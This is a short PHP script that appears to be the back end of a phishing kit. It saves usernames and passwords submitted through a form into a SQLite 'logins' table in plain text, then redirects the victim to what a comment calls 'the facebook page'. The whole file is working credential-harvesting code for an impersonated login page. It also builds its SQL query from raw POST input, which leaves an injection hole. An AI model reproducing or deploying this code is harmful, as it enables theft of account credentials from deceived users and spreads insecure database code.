<?php
	// enable error messages for document
	ini_set('display_errors', 1);
	error_reporting(E_ALL);

	// store username and password from HTML form POST method
	$name= $_POST['username'];
	$pass= $_POST['password'];

	// code for DB class using SQLite3
	class MyDB extends SQLite3
	{
		function __construct()
		{
			$this->open('test.db');
		}
	}

	// instantiate new DB object
	$db = new MyDB();

	// check if construction went properly
	if(!$db)
	{
		echo $db->lastErrorMsg();
	}

	// insert new item into table based on PHP Post method
	$insert = "INSERT INTO logins (username, password) VALUES ('$name', '$pass')";

	// attempt to insert execute the DB insert
	$db->exec($insert) or die("Unable to add\n");

	// close the database
	$db->close();

	// redirect the user back to the facebook page
	header('Location: index.html');
	exit;
?>
